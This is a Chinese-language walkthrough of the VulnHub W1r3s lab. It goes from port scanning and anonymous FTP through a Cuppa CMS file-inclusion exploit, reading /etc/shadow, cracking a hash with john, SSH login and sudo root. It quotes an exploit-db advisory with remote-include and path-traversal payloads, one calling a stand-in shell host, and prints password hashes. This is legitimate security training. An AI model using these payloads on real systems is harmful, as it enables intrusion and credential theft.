---
title: "W1r3s-1.0.1 Vulnhub靶场复现"
description: "W1r3s-1.0.1 Vulnhub靶场复现"
slug: "vulnhub-w1r3s-1-0-1"
pubDate: "2026-10-16"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# W1r3s 1.0.1 VulnHub复现

## 靶场介绍

靶场地址 https://vulnhub.com/entry/w1r3s-101,220/

介绍如下

```markdown
You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).

Difficulty to get a low privileged shell: Beginner/Intermediate

Difficulty to get privilege escalation: Beginner/Intermediate

About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.

If you need any hints, pointers or have questions feel free to email me: specterinthewires at gmail dot com

Virtual Machine: VMware Workstation

## Changelog v1.0.0 - 05/02/2018 v1.0.1 - 08/03/2018
```

### 靶场部署

攻击机 kali 和靶机均部署在 VMware 上，使用nat

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

获取到新的靶机 ip 为 10.10.10.104

### 端口扫描和漏洞探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ sudo nmap -sT -sV -O -sC -p- --min-rate 10000 10.10.10.104
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-13 09:12 -0400
Nmap scan report for 10.10.10.104
Host is up (0.00065s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.10.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:A3:B9:0C (VMware)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 5.1 - 5.15 (96%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 4.10 (94%), Linux 4.4 (93%), Linux 3.10 (92%), Linux 3.16 - 4.6 (92%), OpenWrt 19.07 (Linux 4.14) (92%), Linux 2.6.32 - 3.13 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds
```

| 端口     | 服务  | 标题/版本                                            | 备注                                                                                            |
| -------- | ----- | ---------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| 21/tcp   | FTP   | vsftpd 2.0.8 or later；实际 banner 更像 vsFTPd 3.0.3 | 允许 **anonymous 匿名登录**；根目录可见 `content`、`docs`、`new-employees`；控制/数据连接为明文 |
| 22/tcp   | SSH   | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4                      | Ubuntu Linux；需要凭据或密钥，暂时没有匿名入口                                                  |
| 80/tcp   | HTTP  | Apache httpd 2.4.18 (Ubuntu)                         | 默认页：`Apache2 Ubuntu Default Page: It works`；需要继续做 Web 枚举                            |
| 3306/tcp | MySQL | MySQL (unauthorized)                                 | 未授权/认证失败；需要凭据，且可能限制远程连接                                                   |

nmap 漏洞脚本探测

```shell

```

## 尝试21端口匿名登陆

```shell
curl -s ftp://anonymous:anonymous@10.10.10.104/
```

得到和 nmap 一样的结果，发现三个目录，接下来进行枚举

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/new-employees/
-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/new-employees/employee-names.txt -o employee-names.txt && cat employee-names.txt
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources
```

得到6个员工和职位

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/docs/
-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/docs/worktodo.txt -o worktodo.txt && cat worktodo.txt
        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```

一开始以为是俄文，不过又发现这是垂直颠倒文字和水平颠倒文字，可去搜索搜索引擎去搜索`文字倒置工具`辅助查看

先把全部文字垂直倒置，再看倒置的下一行方向发现文字是水平颠倒的，最后再单独把这行给矫正，最后得到

```text
I don't think this is the way to root!
....we have a lot of work to do, stop playing around....
```

还剩一个目录

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ for f in 01 02 03; do echo "===== $f.txt ====="; curl -s ftp://anonymous:anonymous@10.10.10.104/content/$f.txt; echo; done
===== 01.txt =====
New FTP Server For W1R3S.inc

===== 02.txt =====
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################

===== 03.txt =====
___________.__              __      __  ______________________   _________    .__
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/

```

先对这个相对需要基础的shell命令做个解释

| `for f in 01 02 03`                                     | Shell 循环 | 依次把变量 f 赋值为 01、02、03                                         |
| ------------------------------------------------------- | ---------- | ---------------------------------------------------------------------- |
| `do ... done`                                           | Shell 语法 | 循环体开始和结束                                                       |
| `echo "===== $f.txt ====="`                             | `$f`       | 展开变量 f，打印文件名作为分隔标题                                     |
| `curl`                                                  | 命令       | 从 FTP 读取文件内容并输出到终端                                        |
| `-s`                                                    | curl 选项  | 静默模式，不显示进度条和统计信息                                       |
| `ftp://anonymous:anonymous@10.10.10.104/content/$f.txt` | FTP URL    | 使用匿名账号 anonymous、密码 anonymous 登录，读取 /content/ 下对应文件 |
| `echo`                                                  | Shell 命令 | 输出一个空行，用于分隔不同文件内容                                     |

值得注意是 W1R3S.inc 这个ftp服务在这

还有两个字符 `01ec2d8fc11c493b25029fb1f47f39ce` `SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==` 根据特征识别为 md5 和 base64

最下面的ASCII字符是W1R3S.inc

然后把上两个字符解码和查询为

`This is not a password` 可在`https://www.somd5.com/` 查询得知

`It is easy, but not that easy..`

## Web服务探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ gobuster dir -u http://10.10.10.104 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.104
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd.txt        (Status: 403) [Size: 300]
.htaccess.php        (Status: 403) [Size: 300]
.htaccess.txt        (Status: 403) [Size: 300]
.htpasswd            (Status: 403) [Size: 296]
.htpasswd.php        (Status: 403) [Size: 300]
.htpasswd.html       (Status: 403) [Size: 301]
administrator        (Status: 301) [Size: 320] [--> http://10.10.10.104/administrator/]
.hta.php             (Status: 403) [Size: 295]
.htaccess            (Status: 403) [Size: 296]
.htaccess.html       (Status: 403) [Size: 301]
.hta                 (Status: 403) [Size: 291]
.hta.html            (Status: 403) [Size: 296]
.hta.txt             (Status: 403) [Size: 295]
index.html           (Status: 200) [Size: 11321]
index.html           (Status: 200) [Size: 11321]
javascript           (Status: 301) [Size: 317] [--> http://10.10.10.104/javascript/]
server-status        (Status: 403) [Size: 300]
wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.104/wordpress/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

- wordpress路径重定向回localhost/wordpress
- administrator会重定向会/administrator/install

访问 `http://10.10.10.104/administrator/installation/` 发现是 **Only-Back** 备份系统的安装向导，`Configuration.php Writeable: Yes`，这是一个潜在入口。但先不急着走这条线，因为 WordPress 公开的漏洞很多，优先尝试获取 WordPress 后台权限。

/wordpress 进行枚举尝试

### 在WordPress目录下枚举

虽然被重定向，但是任然可以尝试获取一些信息

WPScan 因重定向无法识别 WordPress，使用 `--ignore-main-redirect --force` 后成功枚举出用户：

```shell
wpscan --url http://10.10.10.104/wordpress/ --ignore-main-redirect --force --enumerate u
```

关键输出

```shell
[+] joseph-g
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

得到两个用户：`admin`、`joseph-g`。其中 `joseph-g` 与 FTP 员工名单里的 `Joseph.G` 对应，格式为“名.姓首字母”转小写并用连字符连接。

不过目前方面也到这了，这里我对密码进行爆破没有获得任何结果

### 在administrator目录下枚举

发现这是一个 CuppaCMS 和 Wordpress 都是 内容管理系统，说明靶机存在两个CMS，这里也不知道为什么要安装两个，不过这个 administrator 页很有说法

![](./file-20261013231027650.png)

Configuration.php Writeable: Yes：非常重要。安装程序可以写入配置文件。这意味着如果安装流程被继续执行，它可能会允许你写入数据库信息，甚至有可能因为过滤不严导致配置文件篡改，进而写入恶意 PHP 代码（这是常见的漏洞点）。

PHP Version >= 5.3: Yes：确认后端支持 PHP。

MySQL Support: Yes：确认支持 MySQL，这与端口扫描发现的 3306 端口呼应。

JSON Support: Yes：支持 JSON，说明它可能提供 API 接口。

File Uploads: On：非常关键。Apache 允许文件上传。如果后续步骤有上传功能，这里极有可能成为上传 WebShell 的入口。

Display Errors: Off：错误显示关闭。这意味着通过报错来进行注入或探测路径的难度会增加，需要盲猜或盲注。

先对当前目录爆破一下

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ gobuster dir -u http://10.10.10.104/administrator/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.104/administrator/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
alerts               (Status: 301) [Size: 327] [--> http://10.10.10.104/administrator/alerts/]
api                  (Status: 301) [Size: 324] [--> http://10.10.10.104/administrator/api/]
.htpasswd            (Status: 403) [Size: 310]
.hta                 (Status: 403) [Size: 305]
classes              (Status: 301) [Size: 328] [--> http://10.10.10.104/administrator/classes/]
components           (Status: 301) [Size: 331] [--> http://10.10.10.104/administrator/components/]
.hta.php             (Status: 403) [Size: 309]
.htaccess            (Status: 403) [Size: 310]
.htaccess.txt        (Status: 403) [Size: 314]
.hta.txt             (Status: 403) [Size: 309]
.htaccess.php        (Status: 403) [Size: 314]
.htpasswd.php        (Status: 403) [Size: 314]
.htpasswd.txt        (Status: 403) [Size: 314]
extensions           (Status: 301) [Size: 331] [--> http://10.10.10.104/administrator/extensions/]
index.php            (Status: 302) [Size: 6946] [--> installation/]
index.php            (Status: 302) [Size: 6946] [--> installation/]
installation         (Status: 301) [Size: 333] [--> http://10.10.10.104/administrator/installation/]
js                   (Status: 301) [Size: 323] [--> http://10.10.10.104/administrator/js/]
language             (Status: 301) [Size: 329] [--> http://10.10.10.104/administrator/language/]
media                (Status: 301) [Size: 326] [--> http://10.10.10.104/administrator/media/]
robots.txt           (Status: 200) [Size: 26]
robots.txt           (Status: 200) [Size: 26]
templates            (Status: 301) [Size: 330] [--> http://10.10.10.104/administrator/templates/]
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```

没啥有用的

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -s http://10.10.10.104/administrator/robots.txt
User-agent: *
Disallow: /
```

也没有信息泄露

## 利用公开漏洞库寻找突破口

目前所有路好像都卡住了，但是CuppaCMS是个开源项目，在GitHub上找得到源码

https://github.com/CuppaCMS/CuppaCMS

看看能不能在公开漏洞库找到入手点

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ searchsploit cuppacms
Exploits: No Results
Shellcodes: No Results
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ searchsploit cuppa
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                           | php/webapps/25971.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

读取这个文件

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
```

从 Exploit 内容看，关键信息如下：

- 漏洞文件：`/alerts/alertConfigField.php`，相对于 Cuppa CMS 根目录。
- 结合你之前扫描到的 `/administrator/` 目录，完整路径很可能是：`http://10.10.10.104/administrator/alerts/alertConfigField.php`。
- 漏洞参数：`urlConfig`，通过 `include($_REQUEST["urlConfig"])` 直接包含，可读任意文件或远程文件。
- 利用方式：`?urlConfig=../../../../../../../../../etc/passwd` 可读 `/etc/passwd`。
- 还可以用 `php://filter` 读 `Configuration.php` 源码，里面可能包含数据库账号密码。

按照这个exp 先访问这个url看看存不存在

![](./file-20261013233843796.png)

存在的，但是为什么是空白的？

http://10.10.10.104/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd 也是同样的结果

`$_REQUEST` 同时存在get和post，接下来试试

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -sS -i --max-time 10
  --data-urlencode 'urlConfig=../../../../../../../../../etc/passwd'
  'http://10.10.10.104/administrator/alerts/alertConfigField.php'

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false

┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ curl -sS --max-time 10 --data-urlencode 'urlConfig=../../../../../../../../../etc/shadow' 'http://10.10.10.104/administrator/alerts/alertConfigField.php'

root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFi:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```

这里我只保留有用的信息

把这三个用户密码保存然后john爆破

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/W1r3s]
└─$ john pass.hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: only loading hashes of type "sha512crypt", but also saw type "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (w1r3s)
```

爆出来w1r3s用户的密码，尝试ssh登陆

## ssh登陆获取w1r3s权限

```shell
┌──(kali㉿kali)-[~]
└─$ ssh w1r3s@10.10.10.104
The authenticity of host '10.10.10.104 (10.10.10.104)' can't be established.
ED25519 key fingerprint is: SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.10.104' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@10.10.10.104's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

108 packages can be updated.
6 updates are security updates.

.....You made it huh?....
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
w1r3s@W1R3S:~$
```

## 提权至root

```shell
w1r3s@W1R3S:~$ id;pwd;whoami;uname -a
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
/home/w1r3s
w1r3s
Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
w1r3s@W1R3S:~$ sudo -l
[sudo] password for w1r3s:
Matching Defaults entries for w1r3s on W1R3S.localdomain:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S.localdomain:
    (ALL : ALL) ALL
```

这个用户是全权限用户，调用root的bash即可提权，或者sudo su

```shell
w1r3s@W1R3S:~$ sudo /bin/bash
root@W1R3S:~# id;pwd;whoami
uid=0(root) gid=0(root) groups=0(root)
/home/w1r3s
root
root@W1R3S:/root# exit
exit
w1r3s@W1R3S:~$ sudo su
root@W1R3S:/home/w1r3s#
root@W1R3S:~# cd /root
root@W1R3S:/root# ls -liah
total 48K
655361 drwx------  6 root root 4.0K Feb  4  2018 .
     2 drwxr-xr-x 24 root root 4.0K Mar  7  2018 ..
659692 -rw-------  1 root root 7.0K Feb  4  2018 .bash_history
655364 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
655363 drwx------  2 root root 4.0K Jan 22  2018 .cache
667676 -rw-r--r--  1 root root 2.0K Feb  4  2018 flag.txt
791671 drwx------  3 root root 4.0K Jan 22  2018 .gnupg
672157 -rw-------  1 root root 1.1K Jan 28  2018 .mysql_history
789470 drwxr-xr-x  2 root root 4.0K Jan 22  2018 .nano
655365 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
796589 drwx------  2 root root 4.0K Jan 22  2018 .ssh
root@W1R3S:/root# cat flag.txt
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/

-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
root@W1R3S:/root#
```

## 问题的总结

为什么之前的GET请求失败？

答：GET 请求中的 `../` 可能被 Apache 或 PHP 的路径规范化处理，导致 `include` 收到的路径不对；而 POST 请求体中的 `../` 不会经过 URL 路径规范化，所以能成功。
